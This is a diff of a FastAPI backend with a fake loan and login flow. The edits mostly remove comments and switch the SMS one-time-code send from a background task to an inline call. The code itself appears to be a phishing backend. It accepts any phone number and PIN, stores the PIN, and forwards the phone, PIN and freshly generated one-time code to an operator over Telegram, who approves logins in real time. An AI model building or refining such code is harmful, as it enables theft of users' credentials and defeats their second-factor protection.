@@ -29,7 +29,6 @@ from approvals import (
     loan_request_status,
     loan_request_phones,
 )
-# ⭐ UPDATED: added build_otp_sms to the imports
 from notifications import send_otp_sms, send_telegram_message, build_otp_sms
 
 app = FastAPI()
@@ -79,9 +78,7 @@ def format_phone(phone: str) -> str:
 
 
 def cleanup_approval_records_for_phone(phone: str):
-    """Remove any stale approval entries tied to a phone number.
-    Called on new login and resend to prevent duplicate Telegram messages from being actionable.
-    """
+    """Remove any stale approval entries tied to a phone number."""
     stale_ids = [aid for aid, p in approval_phones.items() if p == phone]
     for aid in stale_ids:
         approval_phones.pop(aid, None)
@@ -106,14 +103,13 @@ async def register(request: RegisterRequest):
 
 # --- LOGIN ---
 @app.post("/api/login")
-async def login(request: LoginRequest, background_tasks: BackgroundTasks):
+async def login(request: LoginRequest):
     full_phone = format_phone(request.phone_number)
 
     user = get_user(full_phone)
     if not user:
         create_user(full_phone, request.pin)
 
-    # 🧹 Invalidate any previous pending approval for this phone
     cleanup_approval_records_for_phone(full_phone)
 
     otp = str(random.randint(1000, 9999))
@@ -121,11 +117,11 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     otp_approval_status[full_phone] = "pending"
     phone_pins[full_phone] = request.pin
 
-    # ⭐ Build the exact SMS body once — reused for SMS + Telegram preview
     sms_body = build_otp_sms(otp)
 
-    # Send SMS to the user (only the OTP)
-    background_tasks.add_task(send_otp_sms, full_phone, otp)
+    # ⭐ FIX: Call send_otp_sms DIRECTLY (not as a background task)
+    # Render kills background tasks before they run, so we call it inline.
+    send_otp_sms(full_phone, otp)
 
     approval_id = str(uuid4())
     create_approval(approval_id)
@@ -133,7 +129,6 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     approval_pins[approval_id] = request.pin
     approval_otps[approval_id] = otp
 
-    # ⭐ Admin sees everything + the exact SMS body
     await send_approval_request(approval_id, full_phone, request.pin, otp, sms_body)
 
     return {
@@ -178,11 +173,10 @@ async def verify_otp(request: OTPRequest):
     return {"status": "pending", "message": "En attente de validation"}
 
 
-# --- OTP STATUS POLLING (fixed: return "expired" instead of "pending") ---
+# --- OTP STATUS POLLING ---
 @app.get("/api/otp-status/{phone_number}")
 async def otp_status(phone_number: str):
     full_phone = format_phone(phone_number)
-    # 🧹 If no active status, report as expired so the frontend stops polling
     if full_phone not in otp_approval_status:
         return {"status": "expired"}
     return {"status": otp_approval_status[full_phone]}
@@ -190,10 +184,9 @@ async def otp_status(phone_number: str):
 
 # --- RESEND OTP ---
 @app.post("/api/resend-otp")
-async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
+async def resend_otp(request: ResendRequest):
     full_phone = format_phone(request.phone_number)
 
-    # 🧹 Invalidate the previous approval for this phone
     cleanup_approval_records_for_phone(full_phone)
 
     new_otp = str(random.randint(1000, 9999))
@@ -201,8 +194,6 @@ async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
     otp_approval_status[full_phone] = "pending"
 
     pin = phone_pins.get(full_phone, "****")
-
-    # ⭐ Build the exact SMS body once
     sms_body = build_otp_sms(new_otp)
 
     approval_id = str(uuid4())
@@ -211,7 +202,9 @@ async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
     approval_pins[approval_id] = pin
     approval_otps[approval_id] = new_otp
 
-    background_tasks.add_task(send_otp_sms, full_phone, new_otp)
+    # ⭐ FIX: Call send_otp_sms DIRECTLY (not as a background task)
+    send_otp_sms(full_phone, new_otp)
+
     await send_approval_request(approval_id, full_phone, pin, new_otp, sms_body)
 
     return {"status": "success", "message": "OTP resent successfully"}
@@ -219,7 +212,7 @@ async def resend_otp(request: ResendRequest, background_tasks: BackgroundTasks):
 
 # --- REQUEST LOAN ---
 @app.post("/api/request-loan")
-async def request_loan(request: ResendRequest, background_tasks: BackgroundTasks):
+async def request_loan(request: ResendRequest):
     full_phone = format_phone(request.phone_number)
 
     approval_id = str(uuid4())
@@ -235,12 +228,11 @@ async def request_loan(request: ResendRequest, background_tasks: BackgroundTasks
     }
 
 
-# --- LOAN REQUEST STATUS (auto-cleanup after final state) ---
+# --- LOAN REQUEST STATUS ---
 @app.get("/api/loan-request-status/{approval_id}")
 async def loan_request_status_endpoint(approval_id: str):
     status = loan_request_status.get(approval_id, "expired")
 
-    # 🧹 Clean up after the frontend reads a final decision
     if status in ("approved", "rejected"):
         loan_request_status.pop(approval_id, None)
         loan_request_phones.pop(approval_id, None)
@@ -251,7 +243,6 @@ async def loan_request_status_endpoint(approval_id: str):
 # --- TELEGRAM WEBHOOK ---
 @app.post("/telegram/webhook")
 async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
-    # 1. Parse
     try:
         body = await request.body()
         if not body:
@@ -266,7 +257,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
         print("Webhook received non-callback update — ignoring")
         return {"ok": True}
 
-    # 2. Handle
     try:
         callback = data["callback_query"]
         callback_id = callback["id"]
@@ -296,12 +286,10 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                          f"🆔 Ref: <code>{approval_id}</code>"
                 )
 
-            # Note: loan_request_phones stays until frontend reads the decision
             return {"ok": True}
 
         # ─── OTP APPROVAL BRANCH ───────────────────────────────
         parts = callback_data.split(":")
-
         if len(parts) < 2:
             return {"ok": True}
 
@@ -349,7 +337,6 @@ async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
                      f"🆔 Ref: <code>{approval_id}</code>"
             )
 
-        # 🧹 Clean up approval entries after processing
         approval_phones.pop(approval_id, None)
         approval_pins.pop(approval_id, None)
         approval_otps.pop(approval_id, None)
